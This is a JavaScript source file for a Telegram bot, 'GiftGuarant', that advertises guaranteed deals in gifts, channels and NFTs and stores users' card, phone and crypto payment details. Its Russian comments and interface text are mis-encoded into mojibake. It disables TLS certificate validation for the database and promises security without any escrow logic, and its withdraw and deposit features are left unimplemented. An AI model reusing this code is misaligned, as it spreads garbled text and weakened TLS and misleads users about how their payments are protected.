require('dotenv').config();
const { Telegraf, Markup, Scenes, session } = require('telegraf');
const { Pool } = require('pg');

// –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –±–∞–∑–µ
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// –ë–æ—Ç
const bot = new Telegraf(process.env.BOT_TOKEN);

// –ê–¥–º–∏–Ω
const ADMIN_IDS = [123456789];
function isAdmin(userId) { return ADMIN_IDS.includes(userId); }

// SQL
async function dbQuery(query, params = []) {
  try { return await pool.query(query, params); }
  catch (e) { console.error('DB error:', e.message); throw e; }
}

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Ç–∞–±–ª–∏—Ü
async function initDB() {
  await dbQuery(`
    CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      user_id BIGINT UNIQUE NOT NULL,
      username VARCHAR(255),
      first_name VARCHAR(255),
      last_name VARCHAR(255),
      requisites TEXT,
      balance DECIMAL(15,2) DEFAULT 0,
      successful_deals INTEGER DEFAULT 0,
      is_banned BOOLEAN DEFAULT FALSE,
      created_at TIMESTAMPTZ DEFAULT NOW(),
      updated_at TIMESTAMPTZ DEFAULT NOW()
    );
  `);
  await dbQuery(`
    CREATE TABLE IF NOT EXISTS deals (
      id SERIAL PRIMARY KEY,
      deal_id VARCHAR(50) UNIQUE NOT NULL,
      seller_id BIGINT NOT NULL,
      buyer_id BIGINT,
      deal_type VARCHAR(50) NOT NULL,
      product_info TEXT NOT NULL,
      currency VARCHAR(20),
      amount DECIMAL(15,2),
      deal_link TEXT NOT NULL,
      status VARCHAR(20) DEFAULT 'active',
      created_at TIMESTAMPTZ DEFAULT NOW(),
      updated_at TIMESTAMPTZ DEFAULT NOW()
    );
  `);
  await dbQuery(`
    CREATE TABLE IF NOT EXISTS withdrawals (
      id SERIAL PRIMARY KEY,
      user_id BIGINT NOT NULL,
      requisites TEXT NOT NULL,
      amount DECIMAL(15,2) NOT NULL,
      status VARCHAR(20) DEFAULT 'pending',
      created_at TIMESTAMPTZ DEFAULT NOW()
    );
  `);
  console.log('‚úÖ –¢–∞–±–ª–∏—Ü—ã —Å–æ–∑–¥–∞–Ω—ã');
}

// –°—Ü–µ–Ω—ã
const requisitesScene = new Scenes.BaseScene('requisites');
const createDealScene = new Scenes.BaseScene('createDeal');
const withdrawScene = new Scenes.BaseScene('withdraw');
const stage = new Scenes.Stage([requisitesScene, createDealScene, withdrawScene]);
bot.use(session());
bot.use(stage.middleware());

// –§–æ—Ç–æ
const IMAGES = {
  main: 'https://i.ibb.co/XkCzqRyz/main.png',
  deals: 'https://i.ibb.co/rGgjz61s/deals.png',
  createDeal: 'https://i.ibb.co/n2ysqQ9/create.png',
  requisites: 'https://i.ibb.co/0yvxs921/requisites.png'
};

// –£–º–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞/—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è
async function sendOrEdit(ctx, image, caption, buttons) {
  if (ctx.session.lastMessageId) {
    try {
      await ctx.telegram.editMessageMedia(ctx.chat.id, ctx.session.lastMessageId, undefined, { type: 'photo', media: image, caption, parse_mode: 'Markdown' });
      await ctx.telegram.editMessageReplyMarkup(ctx.chat.id, ctx.session.lastMessageId, undefined, buttons.reply_markup);
      return;
    } catch {}
  }
  const msg = await ctx.replyWithPhoto(image, { caption, parse_mode: 'Markdown', ...buttons });
  ctx.session.lastMessageId = msg.message_id;
}

// –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é
async function showMainMenu(ctx) {
  const caption = `üéØ *GiftGuarant*\nüõ°Ô∏è –ù–∞–¥—ë–∂–Ω—ã–π —Å–µ—Ä–≤–∏—Å –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö —Å–¥–µ–ª–æ–∫\n‚ú® –ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:\n‚úÖ –ë–µ–∑ –∫–æ–º–∏—Å—Å–∏–∏\n‚úÖ –ü–æ–¥–¥–µ—Ä–∂–∫–∞ 24/7\n‚úÖ –ü–æ–ª–Ω–∞—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å\n‚úÖ –ú–≥–Ω–æ–≤–µ–Ω–Ω—ã–µ —Å–¥–µ–ª–∫–∏\nüí´ –í–∞—à–∏ —Å–¥–µ–ª–∫–∏ –ø–æ–¥ –∑–∞—â–∏—Ç–æ–π! üõ°Ô∏è`;
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('üí∞ –ú–æ–∏ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã', 'requisites')],
    [Markup.button.callback('üíº –°–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É', 'createDeal')],
    [Markup.button.callback('üóíÔ∏è –ú–æ–∏ —Å–¥–µ–ª–∫–∏', 'myDeals')],
    [Markup.button.callback('‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏', 'settings')]
  ]);
  await sendOrEdit(ctx, IMAGES.main, caption, buttons);
}

// –†–µ–∫–≤–∏–∑–∏—Ç—ã
requisitesScene.enter(async (ctx) => {
  const caption = `üí≥ *–î–æ–±–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç–æ–≤*\nüìù –ü—Ä–∏—à–ª–∏—Ç–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã:\n‚Ä¢ –ö–∞—Ä—Ç–∞\n‚Ä¢ –¢–µ–ª–µ—Ñ–æ–Ω\n‚Ä¢ –ö—Ä–∏–ø—Ç–æ`;
  const buttons = Markup.inlineKeyboard([[Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'mainMenu')]]);
  await sendOrEdit(ctx, IMAGES.requisites, caption, buttons);
});
requisitesScene.on('text', async (ctx) => {
  if (ctx.message.text === '‚è™ –ù–∞–∑–∞–¥') { await showMainMenu(ctx); return ctx.scene.leave(); }
  try {
    await dbQuery(`INSERT INTO users (user_id, requisites, updated_at) VALUES ($1,$2,NOW()) ON CONFLICT(user_id) DO UPDATE SET requisites=$2, updated_at=NOW()`, [ctx.from.id, ctx.message.text]);
    await ctx.reply('‚úÖ –†–µ–∫–≤–∏–∑–∏—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã!');
    return ctx.scene.leave();
  } catch { await ctx.reply('‚ùå –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ä–µ–∫–≤–∏–∑–∏—Ç–æ–≤'); }
});

// –°–æ–∑–¥–∞–Ω–∏–µ —Å–¥–µ–ª–∫–∏
createDealScene.enter(async (ctx) => {
  const caption = `üõçÔ∏è *–°–æ–∑–¥–∞–Ω–∏–µ —Å–¥–µ–ª–∫–∏*\n–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø —Ç–æ–≤–∞—Ä–∞:`;
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('üéÅ –ü–æ–¥–∞—Ä–∫–∏', 'deal_gifts')],
    [Markup.button.callback('üì¢ –ö–∞–Ω–∞–ª', 'deal_channel')],
    [Markup.button.callback('üÜï NFT –ê–∫—Ç–∏–≤—ã', 'deal_nft')],
    [Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'mainMenu')]
  ]);
  await sendOrEdit(ctx, IMAGES.createDeal, caption, buttons);
});

// –í—ã–±–æ—Ä —Ç–∏–ø–∞ —Å–¥–µ–ª–∫–∏
bot.action(/deal_(.+)/, async (ctx) => {
  ctx.session.dealType = ctx.match[1];
  const caption = `–í—ã –≤—ã–±—Ä–∞–ª–∏: *${getDealTypeText(ctx.session.dealType)}*\n–í–≤–µ–¥–∏—Ç–µ –æ–ø–∏—Å–∞–Ω–∏–µ —Ç–æ–≤–∞—Ä–∞:`;
  const buttons = Markup.inlineKeyboard([[Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'createDeal')]]);
  await sendOrEdit(ctx, IMAGES.createDeal, caption, buttons);
  ctx.scene.enter('createDeal');
});

// –í–≤–æ–¥ –æ–ø–∏—Å–∞–Ω–∏—è, –≤–∞–ª—é—Ç—ã, —Å—É–º–º—ã
createDealScene.on('text', async (ctx) => {
  if (!ctx.session.productInfo) {
    ctx.session.productInfo = ctx.message.text;
    const caption = `üíµ –í—ã–±–µ—Ä–∏—Ç–µ –≤–∞–ª—é—Ç—É:`;
    const buttons = Markup.inlineKeyboard([
      [Markup.button.callback('üíé TON', 'currency_TON'), Markup.button.callback('üíµ USDT', 'currency_USDT')],
      [Markup.button.callback('‚≠êÔ∏è STARS', 'currency_STARS'), Markup.button.callback('üá∑üá∫ RUB', 'currency_RUB')],
      [Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'createDeal')]
    ]);
    await sendOrEdit(ctx, IMAGES.createDeal, caption, buttons);
    return;
  }
  if (ctx.session.waitAmount) {
    const amount = parseFloat(ctx.message.text.replace(',', '.'));
    if (isNaN(amount)) { await ctx.reply('‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é —Å—É–º–º—É'); return; }
    ctx.session.amount = amount;

    const dealId = Math.random().toString(36).substring(2,8).toUpperCase();
    const dealLink = `https://t.me/${ctx.botInfo.username}?start=deal_${dealId}`;
    await dbQuery(`INSERT INTO deals (deal_id, seller_id, deal_type, product_info, currency, amount, deal_link) VALUES ($1,$2,$3,$4,$5,$6,$7)`, [dealId, ctx.from.id, ctx.session.dealType, ctx.session.productInfo, ctx.session.currency, ctx.session.amount, dealLink]);

    const caption = `üéâ –°–¥–µ–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞!\nID: ${dealId}\n–¢–∏–ø: ${getDealTypeText(ctx.session.dealType)}\n–°—É–º–º–∞: ${ctx.session.amount} ${ctx.session.currency}\n–°—Å—ã–ª–∫–∞: ${dealLink}`;
    const buttons = Markup.inlineKeyboard([[Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'mainMenu')]]);
    await sendOrEdit(ctx, IMAGES.createDeal, caption, buttons);

    delete ctx.session.productInfo; delete ctx.session.currency; delete ctx.session.amount; delete ctx.session.waitAmount;
    return ctx.scene.leave();
  }
});

// –í—ã–±–æ—Ä –≤–∞–ª—é—Ç—ã
bot.action(/currency_(.+)/, async (ctx) => {
  ctx.session.currency = ctx.match[1];
  ctx.session.waitAmount = true;
  const caption = `–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É —Å–¥–µ–ª–∫–∏ –≤ ${ctx.session.currency}:`;
  const buttons = Markup.inlineKeyboard([[Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'createDeal')]]);
  await sendOrEdit(ctx, IMAGES.createDeal, caption, buttons);
});

// –ú–æ–∏ —Å–¥–µ–ª–∫–∏
bot.action('myDeals', async (ctx) => {
  try {
    const result = await dbQuery('SELECT * FROM deals WHERE seller_id=$1 ORDER BY created_at DESC LIMIT 10', [ctx.from.id]);
    if (!result.rows.length) {
      const caption = `üì≠ *–£ –≤–∞—Å –ø–æ–∫–∞ –Ω–µ—Ç —Å–¥–µ–ª–æ–∫*\n–°–æ–∑–¥–∞–π—Ç–µ –ø–µ—Ä–≤—É—é!`;
      const buttons = Markup.inlineKeyboard([[Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'mainMenu')]]);
      return await sendOrEdit(ctx, IMAGES.deals, caption, buttons);
    }
    for (const deal of result.rows) {
      const caption = `üìã *–°–¥–µ–ª–∫–∞ #${deal.deal_id}*\nüéØ –¢–∏–ø: ${getDealTypeEmoji(deal.deal_type)} ${getDealTypeText(deal.deal_type)}\nüí∞ –°—É–º–º–∞: ${deal.amount || 0} ${deal.currency || ''}\nüìä –°—Ç–∞—Ç—É—Å: ${getStatusEmoji(deal.status)} ${deal.status}\nüïê –°–æ–∑–¥–∞–Ω–∞: ${new Date(deal.created_at).toLocaleDateString('ru-RU')}`;
      const buttons = Markup.inlineKeyboard([
        [Markup.button.url('üì± –û—Ç–∫—Ä—ã—Ç—å —Å–¥–µ–ª–∫—É', deal.deal_link)],
        [Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'mainMenu')]
      ]);
      await sendOrEdit(ctx, IMAGES.deals, caption, buttons);
    }
  } catch (e) { await ctx.reply('‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Å–¥–µ–ª–æ–∫'); }
});

// –ù–∞—Å—Ç—Ä–æ–π–∫–∏
bot.action('settings', async (ctx) => {
  const userRes = await dbQuery('SELECT balance, successful_deals, requisites FROM users WHERE user_id=$1', [ctx.from.id]);
  const user = userRes.rows[0] || { balance: 0, successful_deals:0, requisites:'–Ω–µ —É–∫–∞–∑–∞–Ω—ã' };
  const caption = `‚öôÔ∏è *–ù–∞—Å—Ç—Ä–æ–π–∫–∏*\n–ë–∞–ª–∞–Ω—Å: ${user.balance}‚ÇΩ\n–£—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫: ${user.successful_deals}\n–†–µ–∫–≤–∏–∑–∏—Ç—ã: ${user.requisites? '—É–∫–∞–∑–∞–Ω—ã':'–Ω–µ —É–∫–∞–∑–∞–Ω—ã'}`;
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('üí∞ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å', 'deposit')],
    [Markup.button.callback('üè¶ –í—ã–≤–µ—Å—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞', 'withdraw')],
    [Markup.button.callback('‚úèÔ∏è –ò–∑–º–µ–Ω–∏—Ç—å —Ä–µ–∫–≤–∏–∑–∏—Ç—ã', 'requisites')],
    [Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'mainMenu')]
  ]);
  await sendOrEdit(ctx, IMAGES.main, caption, buttons);
});
bot.action('withdraw', async (ctx) => ctx.scene.enter('withdraw'));

// /start
bot.start(async (ctx) => {
  try {
    await dbQuery(`INSERT INTO users (user_id, username, first_name, last_name) VALUES ($1,$2,$3,$4) ON CONFLICT(user_id) DO NOTHING`, [ctx.from.id, ctx.from.username || '', ctx.from.first_name || '', ctx.from.last_name || '']);
    await showMainMenu(ctx);
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ /start:', error.message);
    await ctx.reply('‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.');
  }
});

// –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
function getDealTypeText(type) { const types = { 'gifts':'–ü–æ–¥–∞—Ä–∫–∏','channel':'–ö–∞–Ω–∞–ª','nft':'NFT –ê–∫—Ç–∏–≤—ã' }; return types[type]||type; }
function getDealTypeEmoji(type) { const emojis = { 'gifts':'üéÅ','channel':'üì¢','nft':'üÜï' }; return emojis[type]||'üíº'; }
function getStatusEmoji(status) { const emojis = { 'active':'üü¢','paid':'üü°','completed':'üîµ','cancelled':'üî¥' }; return emojis[status]||'‚ö™'; }

// –ó–∞–ø—É—Å–∫
initDB().then(() => {
  bot.launch();
  console.log('‚úÖ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω');
});
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
